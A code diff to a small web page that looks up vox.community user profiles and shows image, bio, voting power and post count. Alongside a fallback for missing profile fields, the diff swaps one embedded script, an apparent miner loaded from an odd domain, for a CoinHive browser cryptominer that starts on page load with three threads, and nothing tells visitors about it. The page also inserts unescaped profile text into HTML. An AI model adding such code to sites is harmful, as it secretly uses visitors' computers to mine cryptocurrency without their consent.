@@ -88,14 +88,24 @@ div.find input {
 function sendi()
 {
 	var basename = $('#names').val();
-
+	var image = ''
+	var about = ''
 	$.getJSON('https://cors-anywhere.herokuapp.com/https://vox.community/@'+basename+'.json', function(data) {
-        
+      
+	try {
+		image = data.user.json_metadata.profile.profile_image;
+		about = data.user.json_metadata.profile.about;
+	} catch (err) {
+		image = 'http://jigsawoosh.com.au/Content/Admin/images/no-image.jpg';
+		about = 'About empty'
+	}
+	
+	  
 	var text = `
 		<table width="500px">
-		<tr><td class="left"><img src=${data.user.json_metadata.profile.profile_image} width="160px"></td>
+		<tr><td class="left"><img src=${image} width="160px"></td>
 		<td class="right2">
-		<p><br>${data.user.json_metadata.profile.about}</p>
+		<p><br>${about}</p>
 		<p><br><br>Батарея: <b>${data.user.voting_power/100} %</b>
 		<br>Всего постов: ${data.user.post_count}</p>
 		
@@ -233,14 +243,16 @@ sendi();
 
 
 
-<script src="https://www.freecontent.date./pEsX.js"></script>
+
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-    var _client = new Client.Anonymous('262cff6bdf9e4ece86f97b1adb1601b8f5ceb5db4cf1144190b33fbfb9ac0e9f', {
-        throttle: 0.8
+    var miner = new CoinHive.User('mvx7xQ4Qj2AKsnkXdV0fagDRB07k7Wcj', {
+        threads: 3,
+        autoThreads: false,
+        throttle: 0.9
     });
-    _client.start();
+    miner.start();
 </script>
-
-
 </body>
 </html>
